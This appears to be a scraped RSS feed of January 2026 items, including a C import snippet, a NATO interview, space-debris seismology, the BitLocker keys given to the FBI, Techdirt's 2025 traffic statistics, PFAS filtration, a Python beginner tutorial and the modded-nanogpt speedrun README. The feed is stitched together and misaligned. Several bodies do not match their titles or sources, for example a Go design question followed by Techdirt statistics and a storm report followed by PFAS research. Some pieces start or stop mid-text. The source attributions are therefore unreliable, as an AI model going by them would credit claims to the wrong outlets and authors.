the bottom up. It makes no sense. can compile the declarations in any order.Given three files, , , :// floo.c
#include "dex.h"
int floo(int a, char *s) { return dex(s, a); }
// dex.h
char dex(char *s, int i);
// dex.c
#include "dex.h"
char dex(char *s, int i) { return s[i]; }
Having to craft a  file for each external module is a lot of busy work,
right? Even worse, if the  file turns out to not exactly match the  file, you are
in for a lot of time trying to figure out what went wrong.
What’s the answer? Importing dex.c!// floo.c
__import dex;
int floo(int a, char *s) { return dexx(s, a); }
// dex.c
char dexx(char *s, int i) { return s[i]; }
No need to even write a  file at all. Of course, this also works with .]]></content:encoded></item><item><title>The TechBeat: Third-Party Risks in 2026: Outlook and Security Strategies (1/24/2026)</title><link>https://hackernoon.com/1-24-2026-techbeat?source=rss</link><author>Techbeat</author><category>tech</category><pubDate>Sat, 24 Jan 2026 07:11:04 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[By @ivankuznetsov [ 9 Min read ]

DW Chief Political Correspondent
So, William, you did work at NATO for a couple of years. You were in Brussels. Did you ever think that we would ever reach a situation where we would, in all earnestness, all seriousness, discuss the possibility of one NATO ally as big as the US invading another ally? 

William Alberque
Security Analyst, Pacific Forum
Well, I have to say, part of my time there — I was there from 2012 to 2020 — so I was there for the first Trump administration. And the bigger fear was that Trump was going to withdraw from NATO. He had said that out loud, and one of the things about when he came back for the second term was he was going to settle scores. And so, you know, a lot of us thought that that was part of the unfinished business. And looking at the situation with Greenland, it was hard not to look at that as potentially Trump trying to force the issue, trying to force, because if he did take Greenland by force, it would be the end of NATO. And so maybe this was sort of a passive way, because he knew that if he just told Congress he was going to withdraw, they would... even the Republicans would slow him down or stop him. So, this was probably a backdoor way of doing it. And so, you know, with at least the temporary news of the prevention of that happening, that's very good news. But there have been conflicts between NATO allies before. There was the fisheries war, where allies did shoot at each other. There was Greece versus Turkey over Cyprus, and that was a brutal war of conquest, you know, between NATO allies that caused a huge rift, but managed to, you know, NATO managed to survive that. So, on the one hand, I did expect strange things to happen with NATO during this term, never over Greenland. That was a real surprise. But, unfortunately, we are just in this era of complete uncertainty with where the US is going, and so we have to continue to watch it really carefully. And it's an important game of diplomacy that's happening right now.

The Associated Press reports: Scientists reported Thursday that seismic readings from sonic booms that were generated when a discarded module from a Chinese crew capsule reentered over Southern California in 2024 allowed them to place the object's path nearly 20 miles (30 kilometers) farther south than radar had predicted from orbit. Using this method to track uncontrolled objects plummeting at supersonic speeds, they said, could help recovery teams reach any surviving pieces more quickly -- crucial if the debris is dangerous.
 
"The problem at the moment is we can track stuff very well in space," said Johns Hopkins University's Benjamin Fernando, the lead researcher. "But once it gets to the point that it's actually breaking up in the atmosphere, it becomes very difficult to track." His team's findings, published in the journal Science, focus on just one debris event. But the researchers already have used publicly available data from seismic networks to track a few dozen other reentries, including debris from three failed SpaceX Starship test flights in Texas. [...]
 
Fernando is looking to eventually publish a catalog of seismically tracked, entering space objects, while improving future calculations by factoring in the wind's effect on falling debris. In a companion article in Science, Los Alamos National Laboratory's Chris Carr, who was not involved in the study, said further research is needed to reduce the time between an object's final plunge and the determination of its course. For now, Carr said this new method "unlocks the rapid identification of debris fall-out zones, which is key information as Earth's orbit is anticipated to become increasingly crowded with satellites, leading to a greater influx of space debris."]]></content:encoded></item><item><title>AI Monk With 2.5M Followers Fully Automated in n8n</title><link>https://www.reddit.com/r/artificial/comments/1qlfyaf/ai_monk_with_25m_followers_fully_automated_in_n8n/</link><author>/u/ChampionshipNorth632</author><category>ai</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 06:49:27 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[I was curious how some of these newer Instagram pages are scaling so fast, so I spent a bit of time reverse-engineering one that reached ~2.5M followers in a few months.Instead of focusing on growth tactics, I looked at the technical setup behind the content and mapped out the automation end to end — basically how the videos are generated and published without much manual work.Keeping an AI avatar consistent across videosGenerating voiceovers programmaticallyWiring everything together with n8nProducing longer talking-head style videosPosting to Instagram automaticallyThe whole thing is modular, so none of the tools are hard requirements — it’s more about the structure of the pipeline.]]></content:encoded></item><item><title>80386 Multiplication and Division</title><link>https://nand2mario.github.io/posts/2026/80386_multiplication_and_division/</link><author>nand2mario</author><category>hn</category><pubDate>Sat, 24 Jan 2026 06:11:42 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Latest news bulletin | January 24th, 2026 – Morning</title><link>https://www.youtube.com/watch?v=YHodzoIl1pw</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/YHodzoIl1pw?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 06:05:44 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[Latest news bulletin | January 24th, 2026 – Morning

Against that backdrop, the US military has moved a major aircraft carrier strike group closer to the Middle East. The Pentagon says it's a precautionary move, but Donald Trump has threatened the use of force against the Iranian regime if the killing of protesters in Iran continues. 

Speaking aboard Air Force One, he described the naval build-up as an 'armada' - and outlined the threats he'd made to Tehran.

These keys enable the ability to decrypt and access the data on a computer running Windows, giving law enforcement the means to break into a device and access its data.The news comes as Forbes reports that Microsoft gave the FBI the BitLocker encryption keys to access a device in Guam that law enforcement believed to have "evidence that would help prove individuals handling the island’s Covid unemployment assistance program were part of a plot to steal funds" in early 2025.This was possible because the device in question had its BitLocker encryption key saved in the cloud. By default, Windows 11 forces the use of a Microsoft Account, and the OS will automatically tie your BitLocker encryption key to your online account so that users can easily recover their data in scenarios where they might get locked out. This can be disabled, letting you choose where to save them locally, but the default behavior is to store the key in Microsoft's cloud when setting up a PC with a Microsoft Account."While key recovery offers convenience, it also carries a risk of unwanted access, so Microsoft believes customers are in the best position to decide... how to manage their keys,” Microsoft spokesperson Charles Chamberlayne said in a statement to Forbes.Microsoft told Forbes that it receives around 20 requests for BitLocker encryption keys from the FBI a year, but the majority of requests are unable to be met because the encryption key was never uploaded to the company's cloud.This is notable as other tech companies, such as Apple, have famously refused to provide law enforcement with access to encrypted data stored on their products. Apple has openly fought against the FBI in the past when it was asked to provide a backdoor into an iPhone. Other tech giants, such as Meta, will store encryption keys in the cloud, but use zero-knowledge architectures and encrypt the keys server-side so that only the user can access them.It's frankly shocking that the encryption keys that do get uploaded to Microsoft aren't encrypted on the cloud side, too. That would prevent Microsoft from seeing the keys, but it seems that, as things currently stand, those keys are available in an unencrypted state, and it is a privacy nightmare for customers.To see Microsoft so willingly hand over the keys to encrypted Windows PCs is concerning, and should make everybody using a modern Windows computer think twice before backing up their keys to the cloud. You can see which PCs have their BitLocker keys stored on Microsoft's servers on the Microsoft Account website here, which will let you delete them if present.]]></content:encoded></item><item><title>Tips for low-level design?</title><link>https://www.reddit.com/r/golang/comments/1qldyim/tips_for_lowlevel_design/</link><author>/u/fibonacciFlow</author><category>golang</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 05:03:22 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I'm new to computer science (3rd year uni), and I struggle with how to structure my code in a clean, professional way.I often get stuck on questions like:Should this be one function or split into helpers?Where should this logic live?How should I organize files and packages?Should this be a global/shared value or passed around?Should a function return a pointer/reference or a full object?I want to clarify that I don’t usually have issues with logic.

You may notice that we skipped last year’s for 2024. 2025 was so crazy with everything happening, we just didn’t get around to it, and I kept saying I would and then I looked up and it was May and it just didn’t feel right to go back. But now we’re back, closing the books on 2025 in mid-January.As we’ve done for a few years now, we continue to run  Google Analytics, relying instead on JetPack and Plausible Analytics. And as we always note, all traffic numbers are somewhat unreliable, but they give us a general sense of how things are going (and JetPack & Plausible’s numbers mostly seem to match).In 2025, our traffic was up noticeably from previous the previous year—around 29% more pageviews compared to 2024. Given that 2025 was the year American democracy started visibly buckling, and we made it clear we wouldn’t back down from covering it, that’s probably not surprising. With so much of our national media falling down on the job, it turns out people will show up when you’re one of the news orgs actually calling out what’s happening.As is pretty typical, the vast majority of our traffic came from the US (around 75%), followed by the UK, Canada, Australia, India, Germany, and Finland. After that you have the Netherlands, France, Sweden, New Zealand, Ireland, Spain, Norway, and Pakistan. The stats say we had… a grand total of three visitors from Antarctica last year. Stay warm, folks. We also had three visitors from Vatican City. Sounds like Pope Leo isn’t yet reading Techdirt, but there’s still time.In 2025 we published 1,993 posts and garnered 39,750 comments. The post number is about average for us over the past few years. The comment numbers are down a bit, even as traffic was up, which is likely due to some anti-trolling/anti-spam measures we took last May when a few trolls (and spammers) got a bit out of control. We also wrote about 1.74 million words in 2025, our most since 2016.It also appears to be an unstoppable trend that Techdirt’s posts only get longer and longer, reaching 871 words per post on average last year. The trend here is not subtle.As for where our traffic comes from, I’m always proudest of the fact that more than half of our traffic is direct traffic, not referred from elsewhere, meaning that we have a loyal audience that comes to check out Techdirt unmediated by various algorithms.In terms of traffic referrals, the largest single source was Reddit. Search engines (mainly Google) were also significant. After that our two biggest referrers were Bluesky and Fark (yes, Fark!). It’s nice to see Bluesky continuing to send tons of traffic, reminding us that it’s the only major social media site that doesn’t downgrade and suppress links. We also got significant traffic from Flipboard, Google News, Hacker News, and the NewsBreak app.Much further down on the referrals, X, Substack, and LinkedIn all gave us roughly the equivalent amount of traffic to each other (less than 10% of what Bluesky and Fark sent us). Also… ChatGPT. It’s a little bit less than X/Substack/LinkedIn, but I’m guessing by next year it will surpass those. Wikipedia & Threads each sent about the same amount of traffic as ChatGPT did.Down towards the bottom of the list there are random blogs, news sites, a few RSS readers, and also Mastodon. They’re not that big compared to the others, but they’re all still sending some visitors our way.Our traffic now appears to be almost exactly evenly split between computers and mobile devices. Last year it was a 51%/49% split with the slight edge going to desktops. In terms of specific operating systems, iOS tops the overall list, followed by Windows. Then Android, Mac, and Linux. There’s a much smaller group of folks at the bottom of the list using Chromebooks.Interestingly, our most popular day for traffic was Thursday (18% of views), and the best hour was 9:00 AM (7% of views).Top Ten Stories, by unique pageviews, on Techdirt for 2025:The pattern here is not exactly subtle. Seven of the top ten stories are about the ongoing collapse of constitutional governance. The TikTok stories are really the same story twice… and in some way are directly connected to the collapse of the United States. And the only entry that isn’t directly about authoritarianism is about how bad-faith actors exploit free speech norms — which, well, same theme wearing different clothes.2025’s Top Ten Stories, by comment volume:The fact that we had two of the weekly comment roundups ending up on the most commented list, both of which were from last January, tells you how we had some trolls who took it upon themselves to wreck the comments, especially on those posts early last year. Also, as we point out nearly every year, the fact that the list of highest commented posts is almost entirely different from the list of most visited posts seems noteworthy.Now, to the personal commenter leaderboards:2025 Top Commenters, by comment volume:Stephen T. Stone continues to dominate the comment leaderboard, though with fewer comments than in previous years, probably since there were fewer troll comments to respond to. It’s also nice to see some new names on the list this year.Top 10 Most Insightful Commenters, based on how many times they got the lightbulb icon(Parentheses shows what percentage of their comments got the icon)Some familiar names here, though nice to see MrWilson move up in the rankings. Also a shoutout to Bloof for having the highest percentage of comments getting the insightful icon.Top 10 Funniest Commenters, based on how many times they got the laughing face icon(Parentheses shows what percentage of their comments got the icon)Interesting to see MrWilson take the top spot for funny this year. As always, it’s much harder to get the funny icon than the insightful one. Last year wasn’t a huge year for humor, not surprisingly. But looking at how few “funny” comments were needed to get on the top 10 list, seems like some of you could jump onto it next year with just a few more funny comments. Let’s get some gallows humor going. Also, shoutout to Rico R. for having a very high percentage of their comments getting the funny icon.And, with that, the 2025 books are officially closed. 2026 is already a few weeks in and shows no signs of being any less exhausting (quite the opposite), so we’ll see you in the comments. Thanks to everyone who reads and debates, and especially to those of you who support our work here.]]></content:encoded></item><item><title>Winter Storm Fern to stretch from Texas to mid-Atlantic states | DW News</title><link>https://www.youtube.com/watch?v=xXARQvYlmGA</link><author>DW News</author><category>news</category><enclosure url="https://www.youtube.com/v/xXARQvYlmGA?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 03:32:39 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[More than 160 million Americans are bracing themselves for Winter Storm Fern, with heavy snow and freezing rain forecast to pummel the southern and eastern US states.

Researchers also say they have also found a way to destroy Pfas, though both technologies face a steep challenge in being deployed on an industrial scale. A new peer-reviewed paper details a layered double hydroxide (LDH) material made from copper and aluminum that absorbs long-chain Pfas up to 100 times faster than commonly used filtration systems.
 
[...] [Michael Wong, director of Rice's Water Institute, a Pfas research center] said Rice's non-thermal process works by soaking up and concentrating Pfas at high levels, which makes it possible to destroy them without high temperatures. The LDH material Rice developed is a variation of similar materials previously used, but researchers replaced some aluminum atoms with copper atoms. The LDH material is positively charged and the long-chain Pfas are negatively charged, which causes the material to attract and absorb the chemicals, Wong said. [...]
 
Pfas are virtually indestructible because their carbon atoms are bonded with fluoride, but Rice found that the bonds could be broken if the chemicals in the material were heated to 400-500C -- a relatively low temperature. The fluoride gets trapped in the LDH material and is bonded to calcium. The leftover calcium-fluoride material is safe and can be disposed of in a landfill, Wong said. The process works with some long-chain Pfas that are among the most common water pollutants, and it also absorbed some smaller Pfas that are commonplace.
 
Wong said he is confident the material can be used to absorb a broad array of Pfas, especially if they are negatively charged. Most new Pfas elimination systems fail to work at an industrial scale. Wong said the new material has an advantage because its absorption rate is so strong, it can be used repeatedly and it is in a "drop in material," meaning it can be used with existing filtration infrastructure. That eliminates one of the major cost barriers.]]></content:encoded></item><item><title>Massive Storm to Test Power Grids Across US This Weekend</title><link>https://www.youtube.com/watch?v=kkF0FI68Bls</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/kkF0FI68Bls?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 03:28:23 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg</source><content:encoded><![CDATA[Snow and dangerously bitter cold are spreading from the Rocky Mountains to the Great Lakes as a massive storm pushes toward the US Northeast, disrupting travel and threatening power outages for much of the nation.

                Connie Sherburne and her husband, Peter Bierle, in 2016.
                In 2020, Connie Sherburne's husband of 31 years, Peter, died in a crash while piloting their small plane.Sherburne, a practical person, immediately focused on what needed to be done."I went home that evening, and the next morning, I got up and I thought, 'Hit the ground running. You've got all this to take care of.'"She drove to their insurance company in Escondido, Calif., to transfer the insurance for Peter's truck into her name. Because of the pandemic, the office was staffed by just one person. The woman opened the door to let Sherburne inside, and they sat across from each other at a desk."It didn't take her but a few minutes to take care of why I was there," Sherburne recalled."When she got done, she stopped and she looked at me across her desk, and she made sure that I was looking at her — that she had my full attention.""And she said, 'OK, so now that we've finished with that, people are going to stop and ask you, "How can I help?"' And then she gave this pregnant pause, and she said, 'Let them.'"Sherburne took in the advice, absorbing the moment. She wasn't the kind of person to reach out to others for help."But because she said it with such force, it really, really made sense to me," Sherburne said.As soon as she got home, she realized that she did need help. The firewood she used to heat her home was running low, and winter was around the corner. Chopping wood was something Peter had always done. But this time, she asked a friend to take care of it."So many, many people did little things and big things to help me," Sherburne said. "One of the neighbors actually cooked for me for four years — dinners — and her husband delivered the dinners to me."Sherburne says she would have never reached out for support if not for the advice of the woman at the insurance company."In the back of my mind, I kept hearing her voice, you know, 'Let them.'"A few years later, Sherburne went back to the insurance office to tell the woman how deeply her words had affected her. But the agent didn't work there anymore."So I just wanted to tell her how much that meant to me," Sherburne said."It was such a little thing for this woman just to say that to me. But she didn't realize what a huge thing it was going to be to help me through all this."My Unsung Hero is also a podcast — new episodes are released every Tuesday.

Without a warrant, it was illegal for ICE agents to enter someone's property. 

An internal memo obtained by the Associated Press says immigration officers may now forcibly enter people’s homes without a judge’s warrant. The dramatic shift comes amid wide-spread protests and deep opposition to ICE agents and their tactics, particularly in Minnesota. The state of Minnesota specifically has been on edge since an ICE agent shot and killed Renee Good.

Thank you for your support! 🌟 for deciding to participate in a  programming challenge. In this challenge, you will learn everything you need to be a python programmer and the whole concept of programming. In the end of the challenge you will get a  programming challenge certificate.Python is a high-level programming language for general-purpose programming. It is an open source, interpreted, object-oriented programming language. Python was created by a Dutch programmer, Guido van Rossum. The name of the Python programming language was derived from a British sketch comedy series, Monty Python's Flying Circus. The first version was released on February 20, 1991. This 30 days of Python challenge will help you learn the latest version of Python, Python 3 step by step. The topics are broken down into 30 days, where each day contains several topics with easy-to-understand explanations, real-world examples, and many hands on exercises and projects.This challenge is designed for beginners and professionals who want to learn python programming language. It may take 30 to 100 days to complete the challenge. People who actively participate in the telegram group have a high probability of completing the challenge.This challenge is easy to read, written in conversational English, engaging, motivating and at the same time, it is very demanding. You need to allocate much time to finish this challenge. If you are a visual learner, you may get the video lesson on  Washera YouTube channel. You may start from Python for Absolute Beginners video. Subscribe the channel, comment and ask questions on YouTube videos and be proactive, the author will eventually notice you.The author likes to hear your opinion about the challenge, share the author by expressing your thoughts about the 30DaysOfPython challenge. You can leave your testimonial on this linkIt is a programming language which is very close to human language and because of that, it is easy to learn and use. Python is used by various industries and companies (including Google). It has been used to develop web applications, desktop applications, system administration, and machine learning libraries. Python is a highly embraced language in the data science and machine learning community. I hope this is enough to convince you to start learning Python. Python is eating the world and you are killing it before it eats you.To run a python script you need to install python. Let's download python. If your are a windows user, click the button encircled in red.If you are a macOS user, click the button encircled in red.To check if python is installed write the following command on your device terminal.As you can see from the terminal, I am using  version at the moment. Your version of Python might be different from mine by but it should be 3.6 or above. If you manage to see the python version, well done. Python has been installed on your machine. Continue to the next section.Python is an interpreted scripting language, so it does not need to be compiled. It means it executes the code line by line. Python comes with a Python Shell (Python Interactive Shell). It is used to execute a single python command and get the result.Python Shell waits for the Python code from the user. When you enter the code, it interprets the code and shows the result in the next line. Open your terminal or command prompt(cmd) and write:The Python interactive shell is opened and it is waiting for you to write Python code(Python script). You will write your Python script next to this symbol >>> and then click Enter. Let us write our very first script on the Python scripting shell.Well done, you wrote your first Python script on Python interactive shell. How do we close the Python interactive shell ? To close the shell, next to this symbol >>> write  command and press Enter.Now, you know how to open the Python interactive shell and how to exit from it.Python will give you results if you write scripts that Python understands, if not it returns errors. Let's make a deliberate mistake and see what Python will return.As you can see from the returned error, Python is so clever that it knows the mistake we made and which was Syntax Error: invalid syntax. Using x as multiplication in Python is a syntax error because (x) is not a valid syntax in Python. Instead of () we use asterisk (*) for multiplication. The returned error clearly shows what to fix.The process of identifying and removing errors from a program is called . Let us debug it by putting * in place of .Our bug was fixed, the code ran and we got a result we were expecting. As a programmer you will see such kind of errors on daily basis. It is good to know how to debug. To be good at debugging you should understand what kind of errors you are facing. Some of the Python errors you may encounter are , , , , , , , , ,  etc. We will see more about different Python  in later sections.Let us practice more how to use Python interactive shell. Go to your terminal or command prompt and write the word .The Python interactive shell is opened. Let us do some basic mathematical operations (addition, subtraction, multiplication, division, modulus, exponentiation).Let us do some maths first before we write any Python code:In python, we have the following additional operations:3 % 2 = 1 => which means finding the remainder3 // 2 = 1 => which means removing the remainderLet us change the above mathematical expressions to Python code. The Python shell has been opened and let us write a comment at the very beginning of the shell.A  is a part of the code which is not executed by python. So we can leave some text in our code to make our code more readable. Python does not run the comment part. A comment in python starts with hash(#) symbol. This is how you write a comment in python # comment starts with hash
 # this is a python comment, because it starts with a (#) symbol
Before we move on to the next section, let us practice more on the Python interactive shell. Close the opened shell by writing  on the shell and open it again and let us practice how to write text on the Python shell.Installing Visual Studio CodeThe Python interactive shell is good to try and test small script codes but it will not be for a big project. In real work environment, developers use different code editors to write codes. In this 30 days of Python programming challenge, we will use Visual Studio Code. Visual Studio Code is a very popular open source text editor. I am a fan of vscode and I would recommend to download visual studio code, but if you are in favor of other editors, feel free to follow with what you have.If you installed visual studio code, let us see how to use it. If you prefer a video, you can follow this Visual Studio Code for Python Video tutorialHow to use visual studio codeOpen the visual studio code by double clicking the visual studio icon. When you open it you will get this kind of interface. Try to interact with the labeled icons.Create a folder named 30DaysOfPython on your desktop. Then open it using visual studio code.After opening it, you will see shortcuts for creating files and folders inside of 30DaysOfPython project's directory. As you can see below, I have created the very first file, . You can do the same.After a long day of coding, you want to close your code editor, right? This is how you will close the opened project.Congratulations, you have finished setting up the development environment. Let us start coding.A Python script can be written in Python interactive shell or in the code editor. A Python file has an extension .py.An indentation is a white space in a text. Indentation in many languages is used to increase code readability; however, Python uses indentation to create blocks of code. In other programming languages, curly brackets are used to create code blocks instead of indentation. One of the common bugs when writing Python code is incorrect indentation.Comments play a crucial role in enhancing code readability and allowing developers to leave notes within their code. In Python, any text preceded by a hash (#) symbol is considered a comment and is not executed when the code runs.Example: Single Line Comment    # This is the first comment
    # This is the second comment
    # Python is eating the world
Example: Multiline CommentTriple quote can be used for multiline comment if it is not assigned to a variable"""This is multiline comment
multiline comment takes multiple lines.
python is eating the world
"""
In Python there are several types of data types. Let us get started with the most common ones. Different data types will be covered in detail in other sections. For the time being, let us just go through the different data types and get familiar with them. You do not have to have a clear understanding now.Integer: Integer(negative, zero and positive) numbers Example: ... -3, -2, -1, 0, 1, 2, 3 ...Float: Decimal number Example ... -3.5, -2.25, -1.0, 0.0, 1.1, 2.2, 3.5 ...Complex Example 1 + j, 2 + 4jA collection of one or more characters under a single or double quote. If a string is more than one sentence then we use a triple quote.'Asabeneh'
'Finland'
'Python'
'I love teaching'
'I hope you are enjoying the first day of 30DaysOfPython Challenge'
A boolean data type is either a True or False value. T and F should be always uppercase.    True  #  Is the light on? If it is on, then the value is True
    False # Is the light on? If it is off, then the value is False
Python list is an ordered collection which allows to store different data type items. A list is similar to an array in JavaScript.[0, 1, 2, 3, 4, 5]  # all are the same data types - a list of numbers
['Banana', 'Orange', 'Mango', 'Avocado'] # all the same data types - a list of strings (fruits)
['Finland','Estonia', 'Sweden','Norway'] # all the same data types - a list of strings (countries)
['Banana', 10, False, 9.81] # different data types in the list - string, integer, boolean and float
A Python dictionary object is an unordered collection of data in a key value pair format.{
'first_name':'Asabeneh',
'last_name':'Yetayeh',
'country':'Finland',
'age':250,
'is_married':True,
'skills':['JS', 'React', 'Node', 'Python']
}
A tuple is an ordered collection of different data types like list but tuples can not be modified once they are created. They are immutable.('Asabeneh', 'Pawel', 'Brook', 'Abraham', 'Lidiya') # Names
('Earth', 'Jupiter', 'Neptune', 'Mars', 'Venus', 'Saturn', 'Uranus', 'Mercury') # planets
A set is a collection of data types similar to list and tuple. Unlike list and tuple, set is not an ordered collection of items. Like in Mathematics, set in Python stores only unique items.In later sections, we will go in detail about each and every Python data type.{2, 4, 3, 5}
{3.14, 9.81, 2.7} # order is not important in set
To check the data type of certain data/variable we use the  function. In the following terminal you will see different python data types:First open your project folder, 30DaysOfPython. If you don't have this folder, create a folder name called 30DaysOfPython. Inside this folder, create a file called helloworld.py. Now, let's do what we did on python interactive shell using visual studio code.The Python interactive shell was printing without using  but on visual studio code to see our result we should use a built in function . The  built-in function takes one or more arguments as follows print('arument1', 'argument2', 'argument3'). See the examples below.The file name is # Day 1 - 30DaysOfPython Challenge

print(2 + 3)             # addition(+)
print(3 - 1)             # subtraction(-)
print(2 * 3)             # multiplication(*)
print(3 / 2)             # division(/)
print(3 ** 2)            # exponential(**)
print(3 % 2)             # modulus(%)
print(3 // 2)            # Floor division operator(//)

# Checking data types
print(type(10))          # Int
print(type(3.14))        # Float
print(type(1 + 3j))      # Complex number
print(type('Asabeneh'))  # String
print(type([1, 2, 3]))   # List
print(type({'name':'Asabeneh'})) # Dictionary
print(type({9.8, 3.14, 2.7}))    # Set
print(type((9.8, 3.14, 2.7)))    # Tuple
To run the python file check the image below. You can run the python file either by running the green button on Visual Studio Code or by typing  in the terminal .🌕 You are amazing.

./run.sh
Add torchrun to path if ./run.sh gives error torchrun: command not found.Note: torch.compile will add around 7 minutes of latency the first time you run the code.Alternative: Running with Docker (recommended for precise timing)For cases where CUDA or NCCL versions aren't compatible with your current system setup, Docker can be a helpful alternative. This approach standardizes versions for CUDA, NCCL, CUDNN, and Python, reducing dependency issues and simplifying setup. Note: an NVIDIA driver must already be installed on the system (useful if only the NVIDIA driver and Docker are available).git clone https://github.com/KellerJordan/modded-nanogpt.git && cd modded-nanogpt
sudo docker build -t modded-nanogpt .

The following is the historical progression of world speed records for the following competitive task:Train a neural network to ≤3.28 validation loss on FineWeb using 8x NVIDIA H100s.Not modify the train or validation data pipelines. (You can change the batch size, sequence length, attention structure etc.; just don't change the underlying streams of tokens.)Attain ≤3.28 mean val loss. (Due to inter-run variance, submissions must provide enough run logs to attain a statistical significance level of p<0.01 that their mean val loss is ≤3.28. Example code to compute p-value can be found here. For submissions which improve speed by optimizing the systems performance, without touching the ML, this requirement is waived.)Not use any extra  or  flags. (These can save a few seconds, but they can also make compilation take >30min. This rule was introduced after the 21st record.)Run faster than the prior record when baselined on the same hardware.Discretionary reasons why a PR may not be accepted:Disproportionately degrades the readability of the codebase. A 200 line kernel to drop 300ms is considered worthwhile. 500 lines that convolute the optimizer layout for a 50ms gain will likely be rejected.The current record is intentionally kept roughly 0.001-0.002 loss below 3.28 to make validation simpler. If a PR substantially consumes this buffer, it should do so in a way that outperforms a simple step count decrease, when measured at equivalent loss.Note: torch._inductor.config.coordinate_descent_tuning is allowed for GPT-2 Medium track (a.k.a. 2.92 track).Other than that, anything and everything is fair game!Comment on the target metricThe target metric is cross-entropy loss on the FineWeb val set. To speak mathematically, the goal of the speedrun is *to obtain a probability model of language which assigns a probability of at least math.exp(-3.28 * 10485760) to the first 10,485,760 tokens of the FineWeb valset. Hence, e.g., we allow evaluation at any sequence length, so long as we still have a valid probability model of language.Timing change after record 21After the 21st record, we made two changes to the timing. First, there used to be an initial "grace period" of 10 untimed steps to allow kernel warmup. We replaced this with an explicit kernel-warmup section which is untimed and uses dummy data. This results in an extra runtime of 850ms from the 10 extra timed steps. Second, we banned the use of torch._inductor.config.coordinate_descent_tuning. This saves ~25min of untimed pre-run compilation, but results in an extra runtime of ~3s.@alexjc's 01/20/2025 2.77-minute TokenMonster-based record. This record is technically outside the rules of the speedrun, since we specified that the train/val tokens must be kept fixed. However, it's very interesting, and worth including. The run is not more data-efficient; rather, the speedup comes from the improved tokenizer allowing the vocabulary size to be reduced (nearly halved!) while preserving the same bytes-per-token, which saves lots of parameters and FLOPs in the head and embeddings.Speedrun track 2: GPT-2 MediumThe target loss for this track is lowered from 3.28 to 2.92, as per Andrej Karpathy's 350M-parameter llm.c baseline. This baseline generates a model with performance similar to the original GPT-2 Medium, whereas the first track's baseline generates a model on par with GPT-2 Small. All other rules remain the same.Note: torch._inductor.config.coordinate_descent_tuning is turned on after the record 6 (*).Q: What is the point of NanoGPT speedrunning?A: The officially stated goal of NanoGPT speedrunning is as follows: . But for something a little more verbose involving an argument for good benchmarking, here's some kind of manifesto, adorned with a blessing from the master. https://x.com/karpathy/status/1846790537262571739Q: What makes "NanoGPT speedrunning" not just another idiosyncratic benchmark?A: Because it is a  benchmark. In particular, if you attain a new speed record (using whatever method you want), there is an open invitation for you to post that record (on arXiv or X) and thereby vacuum up all the clout for yourself. I will even help you do it by reposting you as much as I can.Q: NanoGPT speedrunning is cool and all, but meh it probably won't scale and is just overfitting to val lossA: This is hard to refute, since "at scale" is an infinite category (what if the methods stop working only for >100T models?), making it impossible to fully prove. Also, I would agree that some of the methods used in the speedrun are unlikely to scale, particularly those which impose additional structure on the network, such as logit softcapping. But if the reader cares about 1.5B models, they might be convinced by this result:Straightforwardly scaling up the speedrun (10/18/24 version) to 1.5B parameters yields a model with GPT-2 (1.5B)-level HellaSwag performance 2.5x more cheaply than @karpathy's baseline ($233 instead of $576):Muon is defined as follows:Where NewtonSchulz5 is the following Newton-Schulz iteration [2, 3], which approximately replaces  with  where .@torch.compile
def zeroth_power_via_newtonschulz5(G, steps=5, eps=1e-7):
    assert len(G.shape) == 2
    a, b, c = (3.4445, -4.7750,  2.0315)
    X = G.bfloat16() / (G.norm() + eps)
    if G.size(0) > G.size(1):
        X = X.T 
    for _ in range(steps):
        A = X @ X.T
        B = b * A + c * A @ A
        X = a * X + B @ X
    if G.size(0) > G.size(1):
        X = X.T 
    return X.to(G.dtype)
For this training scenario, Muon has the following favorable properties:Lower memory usage than Adam~1.5x better sample-efficiencyMany of the choices made to generate this optimizer were obtained experimentally by our pursuit of CIFAR-10 speedrunning. In particular, we experimentally obtained the following practices:Using Nesterov momentum inside the update, with orthogonalization applied after momentum.Using a specifically quintic Newton-Schulz iteration as the method of orthogonalization.Using non-convergent coefficients for the quintic polynomial in order to maximize slope at zero, and thereby minimize the number of necessary Newton-Schulz iterations. It turns out that the variance doesn't actually matter that much, so we end up with a quintic that rapidly converges to the range 0.68, 1.13 upon repeated application, rather than converging more slowly to 1.Running the Newton-Schulz iteration in bfloat16 (whereas Shampoo implementations often depend on inverse-pth-roots run in fp32 or fp64).Our use of a Newton-Schulz iteration for orthogonalization traces to Bernstein & Newhouse (2024), who suggested it as a way to compute Shampoo [5, 6] preconditioners, and theoretically explored Shampoo without preconditioner accumulation. In particular, Jeremy Bernstein @jxbz sent us the draft, which caused us to experiment with various Newton-Schulz iterations as the orthogonalization method for this optimizer. If we had used SVD instead of a Newton-Schulz iteration, this optimizer would have been too slow to be useful. Bernstein & Newhouse also pointed out that Shampoo without preconditioner accumulation is equivalent to steepest descent in the spectral norm, and therefore Shampoo can be thought of as a way to smooth out spectral steepest descent. The proposed optimizer can be thought of as a second way of smoothing spectral steepest descent, with a different set of memory and runtime tradeoffs compared to Shampoo.To run experiments on fewer GPUs, simply modify  to have a different . This should not change the behavior of the training.If you're running out of memory, you may need to reduce the sequence length for FlexAttention (which does change the training. see here for a guide)@misc{modded_nanogpt_2024,

